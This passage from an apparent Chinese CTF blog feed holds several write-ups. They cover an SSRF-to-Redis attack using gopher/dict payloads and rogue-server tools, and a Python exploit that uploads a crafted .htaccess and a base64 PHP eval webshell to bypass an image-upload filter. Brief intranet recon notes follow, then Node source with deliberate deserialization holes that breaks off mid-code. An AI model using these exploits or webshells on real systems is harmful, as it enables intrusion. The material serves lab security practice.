    <content type="html"><![CDATA[<blockquote><p>ssrf总感觉不是很清楚，得多做点题目了解一下</p></blockquote><p>给了源码</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$match_result</span>=preg_match(<span class="hljs-string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="hljs-variable">$url</span>);    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>)    &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);    &#125;    <span class="hljs-keyword">try</span>    &#123;        <span class="hljs-variable">$url_parse</span>=parse_url(<span class="hljs-variable">$url</span>);    &#125;    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)    &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];    <span class="hljs-variable">$ip</span>=gethostbyname(<span class="hljs-variable">$hostname</span>);    <span class="hljs-variable">$int_ip</span>=ip2long(<span class="hljs-variable">$ip</span>);    <span class="hljs-keyword">return</span> ip2long(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || ip2long(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (check_inner_ip(<span class="hljs-variable">$url</span>))    &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27; is inner ip&#x27;</span>;    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-variable">$ch</span> = curl_init();        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);        <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);        <span class="hljs-variable">$result_info</span> = curl_getinfo(<span class="hljs-variable">$ch</span>);        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>])        &#123;            safe_request_url(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]);        &#125;        curl_close(<span class="hljs-variable">$ch</span>);        var_dump(<span class="hljs-variable">$output</span>);    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$url</span>))&#123;        safe_request_url(<span class="hljs-variable">$url</span>);    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-comment">// Please visit hint.php locally.</span><span class="hljs-meta">?&gt;</span></code></pre><p>第一步是要本地访问<code>hint.php</code></p><p><code>parse_url</code>与<code>libcurl</code>对url的解析差异绕过<code>check_inner_ip</code>函数对内网地址的判断</p><pre><code class="hljs php">/?url=http:<span class="hljs-comment">//u:p@127.0.0.1:80@baidu.com/hint.php</span></code></pre><p>但是buu上只能用<code>0.0.0.0</code>绕</p><pre><code class="hljs php">?url=http:<span class="hljs-comment">//0.0.0.0/hint.php</span></code></pre><p>就有了如下代码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;  highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;  file_put_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>],<span class="hljs-string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);&#125;</code></pre><p>然后就是打redis，带口令那种</p><pre><code class="hljs routeros"><span class="hljs-comment"># 先用dict协议探测下</span>/?<span class="hljs-attribute">url</span>=dict://0.0.0.0:6379<span class="hljs-comment"># 结果</span>string(39) <span class="hljs-string">&quot;-NOAUTH Authentication required.</span><span class="hljs-string">+OK</span><span class="hljs-string">&quot;</span><span class="hljs-comment"># 需要口令，在hint.php中写明了密码是root</span>/?<span class="hljs-attribute">url</span>=dict://0.0.0.0:6379/auth+root</code></pre><p><code>dict</code>一次只能执行一个命令,所以还得用<code>gopher</code>协议</p><p>攻击脚本：</p><p><a href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a>  </p><p>在这里下exp.so</p><p> <a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a>   </p><p>用<code>ssrf-redis.py</code>生成payload # 需要改下ip、命令和redis的口令</p><p>执行<code>roguee-server.py</code>来伪造服务</p><pre><code class="hljs perl"><span class="hljs-comment">#!/bin/bash</span><span class="hljs-keyword">while</span> [ <span class="hljs-string">&quot;1&quot;</span> = <span class="hljs-string">&quot;1&quot;</span> ]<span class="hljs-keyword">do</span>python rogue-server.py done</code></pre><p><img src="https://s1.ax1x.com/2020/06/03/tU45CQ.png" alt="tU45CQ.png"></p><p>payload要再url编码一次，因为传送到服务器解码一次，libcurl传递的url也需要编码</p><p>参考：</p><p><a href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a>   </p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a>   </p><p><a href="https://www.secpulse.com/archives/132215.html">https://www.secpulse.com/archives/132215.html</a></p><p><a href="https://guokeya.github.io/post/UwrwldTcP/">https://guokeya.github.io/post/UwrwldTcP/</a></p><p><a href="https://mp.weixin.qq.com/s/W9joCtUQfNA62ZWXwqMmsw">https://mp.weixin.qq.com/s/W9joCtUQfNA62ZWXwqMmsw</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssrf打redis带口令</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>l33t-hoster</title>
    <link href="/2020/05/29/l33t-hoster/"/>
    <url>/2020/05/29/l33t-hoster/</url>
    
    <content type="html"><![CDATA[<p>一眼望过去是一个上传题，很容易就发现<code>/?source</code>有源码</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;source&quot;</span>]))     <span class="hljs-keyword">die</span>(highlight_file(<span class="hljs-keyword">__FILE__</span>));session_start();<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;home&quot;</span>])) &#123;    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;home&quot;</span>] = bin2hex(random_bytes(<span class="hljs-number">20</span>));&#125;<span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;images/<span class="hljs-subst">&#123;$_SESSION[&quot;home&quot;]&#125;</span>/&quot;</span>;<span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-variable">$userdir</span>)) &#123;    mkdir(<span class="hljs-variable">$userdir</span>);&#125;<span class="hljs-variable">$disallowed_ext</span> = <span class="hljs-keyword">array</span>(    <span class="hljs-string">&quot;php&quot;</span>,    <span class="hljs-string">&quot;php3&quot;</span>,    <span class="hljs-string">&quot;php4&quot;</span>,    <span class="hljs-string">&quot;php5&quot;</span>,    <span class="hljs-string">&quot;php7&quot;</span>,    <span class="hljs-string">&quot;pht&quot;</span>,    <span class="hljs-string">&quot;phtm&quot;</span>,    <span class="hljs-string">&quot;phtml&quot;</span>,    <span class="hljs-string">&quot;phar&quot;</span>,    <span class="hljs-string">&quot;phps&quot;</span>,);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;upload&quot;</span>])) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;yuuuge fail&quot;</span>);    &#125;    <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;image&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;image&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];    <span class="hljs-variable">$parts</span> = explode(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$name</span>);    <span class="hljs-variable">$ext</span> = array_pop(<span class="hljs-variable">$parts</span>);    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$parts</span>[<span class="hljs-number">0</span>])) &#123;        array_shift(<span class="hljs-variable">$parts</span>);    &#125;    <span class="hljs-keyword">if</span> (count(<span class="hljs-variable">$parts</span>) === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;lol filename is empty&quot;</span>);    &#125;    <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$disallowed_ext</span>, <span class="hljs-literal">TRUE</span>)) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;lol nice try, but im not stupid dude...&quot;</span>);    &#125;    <span class="hljs-variable">$image</span> = file_get_contents(<span class="hljs-variable">$tmp_name</span>);    <span class="hljs-keyword">if</span> (mb_strpos(<span class="hljs-variable">$image</span>, <span class="hljs-string">&quot;&lt;?&quot;</span>) !== <span class="hljs-literal">FALSE</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;why would you need php in a pic.....&quot;</span>);    &#125;    <span class="hljs-keyword">if</span> (!exif_imagetype(<span class="hljs-variable">$tmp_name</span>)) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not an image.&quot;</span>);    &#125;    <span class="hljs-variable">$image_size</span> = getimagesize(<span class="hljs-variable">$tmp_name</span>);    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$image_size</span>[<span class="hljs-number">0</span>] !== <span class="hljs-number">1337</span> || <span class="hljs-variable">$image_size</span>[<span class="hljs-number">1</span>] !== <span class="hljs-number">1337</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;lol noob, your pic is not l33t enough&quot;</span>);    &#125;    <span class="hljs-variable">$name</span> = implode(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$parts</span>);    move_uploaded_file(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$userdir</span> . <span class="hljs-variable">$name</span> . <span class="hljs-string">&quot;.&quot;</span> . <span class="hljs-variable">$ext</span>);&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3&gt;Your &lt;a href=<span class="hljs-subst">$userdir</span>&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;&quot;</span>;<span class="hljs-keyword">foreach</span>(glob(<span class="hljs-variable">$userdir</span> . <span class="hljs-string">&quot;*&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;li&gt;&lt;a href=&#x27;<span class="hljs-subst">$file</span>&#x27;&gt;<span class="hljs-subst">$file</span>&lt;/a&gt;&lt;/li&gt;&quot;</span>;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/ul&gt;&quot;</span>;<span class="hljs-meta">?&gt;</span>&lt;h1&gt;Upload your pics!&lt;/h1&gt;&lt;form method=<span class="hljs-string">&quot;POST&quot;</span> action=<span class="hljs-string">&quot;?&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;image&quot;</span>&gt;    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=upload&gt;&lt;/form&gt;&lt;!-- /?source --&gt;<span class="hljs-number">1</span></code></pre><p>设置了黑名单，其中最难绕的在这里</p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$image_size</span>[<span class="hljs-number">0</span>] !== <span class="hljs-number">1337</span> || <span class="hljs-variable">$image_size</span>[<span class="hljs-number">1</span>] !== <span class="hljs-number">1337</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;lol noob, your pic is not l33t enough&quot;</span>);    &#125;</code></pre><p>采用xbm格式绕过构造<code>.htaccess</code></p><pre><code class="hljs stylus"><span class="hljs-number">#def</span>ine <span class="hljs-attribute">width</span> <span class="hljs-number">1337</span><span class="hljs-number">#def</span>ine <span class="hljs-attribute">height</span> <span class="hljs-number">1337</span>AddType application/x-httpd-php .corb3nikphp_value auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=shell.corb3nik</span></code></pre><p>或则用<code>\x00\x00\x8a\x39\x8a\x39 开头来绕过</code></p><pre><code class="hljs php">import requestsimport base64VALID_WBMP = <span class="hljs-string">b&quot;\x00\x00\x8a\x39\x8a\x39\x0a&quot;</span>URL = <span class="hljs-string">&quot;http://5890cd28-30e8-494e-9b48-471d8fb17678.node3.buuoj.cn/&quot;</span>RANDOM_DIRECTORY = <span class="hljs-string">&quot;952bb71de149c92301cc24a49edbb0c6810dfd39&quot;</span>COOKIES = &#123;    <span class="hljs-string">&quot;PHPSESSID&quot;</span> : <span class="hljs-string">&quot;nj32urf3id18f8vueuk988biv0&quot;</span>&#125;def upload_content(name, content):    data = &#123;        <span class="hljs-string">&quot;image&quot;</span> : (name, content, <span class="hljs-string">&#x27;image/png&#x27;</span>),        <span class="hljs-string">&quot;upload&quot;</span> : (None, <span class="hljs-string">&quot;Submit Query&quot;</span>, None)    &#125;    response = requests.post(URL, files=data, cookies=COOKIES)HT_ACCESS = VALID_WBMP + <span class="hljs-string">b&quot;&quot;</span><span class="hljs-string">&quot;</span><span class="hljs-string">AddType application/x-httpd-php .corb3nik</span><span class="hljs-string">php_value auto_append_file &quot;</span>php:<span class="hljs-comment">//filter/convert.base64-decode/resource=shell.corb3nik&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><span class="hljs-string">TARGET_FILE = VALID_WBMP + b&quot;</span>AA<span class="hljs-string">&quot; + base64.b64encode(b&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-meta">&lt;?php</span>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;well&quot;</span>;  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;well&quot;</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;)</span><span class="hljs-string"></span><span class="hljs-string">upload_content(&quot;</span>..htaccess<span class="hljs-string">&quot;, HT_ACCESS)</span><span class="hljs-string">upload_content(&quot;</span>shell.corb3nik<span class="hljs-string">&quot;, TARGET_FILE)</span><span class="hljs-string">upload_content(&quot;</span>trigger.corb3nik<span class="hljs-string">&quot;, VALID_WBMP)</span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">response = requests.post(URL + &quot;</span>/images/<span class="hljs-string">&quot; + RANDOM_DIRECTORY + &quot;</span>/trigger.corb3nik<span class="hljs-string">&quot;)</span><span class="hljs-string">print(response.text)</span></code></pre><p>最后需要绕disable_function，蚁剑插件可以绕出来，再后面是计算加法得flag，抄了一个<code>perl </code>脚本</p><pre><code class="hljs perl"><span class="hljs-comment">#define width 1337</span><span class="hljs-comment">#define height 1337</span><span class="hljs-comment">#!/usr/bin/env perl </span><span class="hljs-keyword">use</span> warnings;<span class="hljs-keyword">use</span> strict;<span class="hljs-keyword">use</span> IPC::Open2;$| = <span class="hljs-number">1</span>;<span class="hljs-keyword">chdir</span> <span class="hljs-string">&quot;/&quot;</span>; <span class="hljs-comment">#!!!!!!!!!!!!!!!!!!!!!!!!!!</span><span class="hljs-keyword">my</span> $pid = open2(\*out2, \*in2, <span class="hljs-string">&#x27;./get_flag&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>;<span class="hljs-keyword">my</span> $reply = &lt;out2&gt;;<span class="hljs-keyword">print</span> STDOUT $reply; <span class="hljs-comment">#string: solve captcha..</span>$reply = &lt;out2&gt;;<span class="hljs-keyword">print</span> STDOUT $reply; <span class="hljs-comment">#captcha formula</span><span class="hljs-keyword">my</span> $answer = <span class="hljs-keyword">eval</span>($reply);<span class="hljs-keyword">print</span> STDOUT <span class="hljs-string">&quot;answer: $answer\n&quot;</span>; <span class="hljs-keyword">print</span> in2 <span class="hljs-string">&quot; $answer &quot;</span>; <span class="hljs-comment">#send it to process</span>in2-&gt;flush();$reply = &lt;out2&gt;;<span class="hljs-keyword">print</span> STDOUT $reply; <span class="hljs-comment">#flag :D</span></code></pre><p>上传执行就可以得到flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网</title>
    <link href="/2020/05/29/%E5%86%85%E7%BD%91/"/>
    <url>/2020/05/29/%E5%86%85%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<blockquote><p>入门内网的笔记</p></blockquote><h1 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h1><ol><li>工作组</li><li>域： 域控制器 (DC)   备份域控制器(BDC)  目的获取域控制器权限</li><li>安全域  DMZ和内网</li><li>不看了 艹</li></ol><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ol><li>ifconfig /all  看本机地址</li><li>net user  看用户</li><li>net localgroup administrators  本机管理员</li></ol>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WHUCTF</title>
    <link href="/2020/05/28/WHUCTF/"/>
    <url>/2020/05/28/WHUCTF/</url>
    
    <content type="html"><![CDATA[<blockquote><p>记录一下武汉大学的新生赛的两题</p></blockquote><h1 id="HappyGame"><a href="#HappyGame" class="headerlink" title="HappyGame"></a>HappyGame</h1><p>查看源码有<code>var backup = &quot;/BackUp.zip&quot;</code>,下载下来发现是源码</p><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<span class="hljs-keyword">const</span> opn = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;opn&#x27;</span>);<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express-session&quot;</span>);<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<span class="hljs-keyword">const</span> stringRandom = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;string-random&#x27;</span>);<span class="hljs-keyword">const</span> app = express();<span class="hljs-keyword">const</span> FUNCFLAG = <span class="hljs-string">&#x27;_$$ND_FUNC$$_&#x27;</span>;<span class="hljs-keyword">const</span> serialize_banner = <span class="hljs-string">&#x27;&#123;&quot;banner&quot;:&quot;Congratulations! 你是目前最高分！&quot;&#125;&#x27;</span>;app.use(bodyParser());app.use(bodyParser.json());<span class="hljs-keyword">const</span> logs=&#123;&#125;;<span class="hljs-keyword">var</span> highestScore = <span class="hljs-number">400</span>;<span class="hljs-keyword">const</span> serialize = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>) </span>&#123;  <span class="hljs-keyword">var</span> outputObj = &#123;&#125;;  <span class="hljs-keyword">var</span> key;  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;    <span class="hljs-keyword">return</span> <span class="hljs-built_in">JSON</span>.stringify(obj);  &#125;  <span class="hljs-keyword">for</span>(key <span class="hljs-keyword">in</span> obj) &#123;    <span class="hljs-keyword">if</span>(obj.hasOwnProperty(key)) &#123;      <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> obj[key] === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;        <span class="hljs-keyword">var</span> funcStr = obj[key].toString();        outputObj[key] = FUNCFLAG + funcStr;      &#125; <span class="hljs-keyword">else</span> &#123;        outputObj[key] = obj[key];      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-built_in">JSON</span>.stringify(outputObj);&#125;;<span class="hljs-keyword">const</span> validCode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">func_code</span>)</span>&#123;  <span class="hljs-keyword">let</span> validInput = <span class="hljs-regexp">/process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base64|&quot;|&#x27;|\[|\+|\*/ig</span>;  <span class="hljs-keyword">return</span> !validInput.test(func_code);&#125;;<span class="hljs-keyword">const</span> validInput = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">input</span>)</span>&#123;  <span class="hljs-comment">// filter bad input</span>  <span class="hljs-keyword">let</span> validInput = <span class="hljs-regexp">/process|child_process|main|require|exec|this|function/ig</span>;  ins = serialize(input);  <span class="hljs-keyword">return</span> !validInput.test(ins);&#125;;<span class="hljs-comment">// not safe</span><span class="hljs-keyword">const</span> unserialize = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>) </span>&#123;  obj = <span class="hljs-built_in">JSON</span>.parse(obj);  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;    <span class="hljs-keyword">return</span> obj;  &#125;  <span class="hljs-keyword">var</span> key;  <span class="hljs-keyword">for</span>(key <span class="hljs-keyword">in</span> obj) &#123;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> obj[key] === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;      <span class="hljs-keyword">if</span>(obj[key].indexOf(FUNCFLAG) === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">var</span> func_code=obj[key].substring(FUNCFLAG.length);        <span class="hljs-keyword">if</span> (validCode(func_code))&#123;          <span class="hljs-keyword">var</span> d = <span class="hljs-string">&#x27;(&#x27;</span> + func_code + <span class="hljs-string">&#x27;)&#x27;</span>;          obj[key] = <span class="hljs-built_in">eval</span>(d);        &#125;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> obj;&#125;;<span class="hljs-keyword">const</span> merge = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">target, source</span>) </span>&#123;  <span class="hljs-keyword">try</span>&#123;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> source[key] == <span class="hljs-string">&#x27;object&#x27;</span> ) &#123;        merge(target[key], source[key]);      &#125; <span class="hljs-keyword">else</span> &#123;        target[key] = source[key];      &#125;    &#125;  &#125;  <span class="hljs-keyword">catch</span> (e) &#123;    <span class="hljs-built_in">console</span>.log(e);  &#125;&#125;;<span class="hljs-keyword">const</span> genSanbox = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req</span>)</span>&#123;  <span class="hljs-keyword">var</span> content = stringRandom(<span class="hljs-number">32</span>);  <span class="hljs-keyword">var</span> result = crypto.createHash(<span class="hljs-string">&#x27;md5&#x27;</span>).update(content).digest(<span class="hljs-string">&quot;hex&quot;</span>);  req.session.sanbox = result;  logs[result] = <span class="hljs-keyword">new</span> Record();  <span class="hljs-keyword">return</span> result;&#125;;<span class="hljs-keyword">const</span> getSanbox = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req</span>)</span>&#123;  <span class="hljs-keyword">return</span> req.session.sanbox;&#125;;app.use(session(&#123;  secret: <span class="hljs-string">&#x27;hahahahahaha@@@@@@&#x27;</span>,  name : <span class="hljs-string">&#x27;sessionId&#x27;</span>,  resave: <span class="hljs-literal">false</span>,  saveUninitialized: <span class="hljs-literal">false</span>&#125;));app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>)</span>&#123;  <span class="hljs-keyword">if</span>(!getSanbox(req))&#123;    genSanbox(req);  &#125;  <span class="hljs-keyword">if</span>(validInput(req.body)) &#123;    next();  &#125; <span class="hljs-keyword">else</span>&#123;    res.status(<span class="hljs-number">403</span>).send(<span class="hljs-string">&#x27;Hacker!!!&#x27;</span>);  &#125;&#125;);<span class="hljs-keyword">const</span> clearEnvir = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-keyword">for</span>(key <span class="hljs-keyword">in</span> <span class="hljs-built_in">Object</span>())&#123;<span class="hljs-keyword">delete</span> &#123;&#125;.__proto__[key]&#125;;&#125;;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Record</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-built_in">this</span>.lastScore=<span class="hljs-number">0</span>;  <span class="hljs-built_in">this</span>.maxScore=<span class="hljs-number">0</span>;  <span class="hljs-built_in">this</span>.lastTime=<span class="hljs-literal">null</span>;&#125;<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">record</span> (<span class="hljs-params">req, res, next</span>)</span>&#123;  <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">resolve, reject</span>) </span>&#123;    <span class="hljs-keyword">var</span> sanbox = getSanbox(req);    <span class="hljs-keyword">var</span> record = <span class="hljs-keyword">new</span> Record();    <span class="hljs-keyword">var</span> score = req.body.score;    <span class="hljs-keyword">var</span> oldRecord = logs[sanbox];    <span class="hljs-built_in">console</span>.log(score);    clearEnvir();    <span class="hljs-keyword">if</span> (score.length&lt;<span class="hljs-number">5</span>)&#123;      merge(record, &#123;        lastScore: score,        maxScore: <span class="hljs-built_in">parseInt</span>(logs[sanbox].maxScore)&gt;<span class="hljs-built_in">parseInt</span>(score)?logs[sanbox].maxScore:score,        lastTime: <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().toString()      &#125;);      logs[sanbox] = record;      oldRecord.maxScore = record.maxScore;      highestScore = highestScore &gt; <span class="hljs-built_in">parseInt</span>(score)? highestScore: <span class="hljs-built_in">parseInt</span>(score);      <span class="hljs-keyword">if</span>((score - highestScore)&lt;<span class="hljs-number">0</span>)&#123;        <span class="hljs-keyword">var</span> banner = <span class="hljs-string">&quot;再接再厉，马上就要赶上最高分了！&quot;</span>;      &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-comment">// var serialize_banner = req.params.data;</span>        <span class="hljs-keyword">var</span> banner = unserialize(serialize_banner).banner;      &#125;    &#125;<span class="hljs-keyword">else</span>&#123;      banner=<span class="hljs-string">&quot;我都打不了这么高， 你小子肯定作弊了&quot;</span>;    &#125;    clearEnvir();    res.json(&#123;      banner: banner,      record: oldRecord    &#125;);  &#125;).catch(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>)</span>&#123;    next(err)  &#125;)&#125;app.post(<span class="hljs-string">&#x27;/record&#x27;</span>, record);app.get(<span class="hljs-string">&#x27;/token&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, 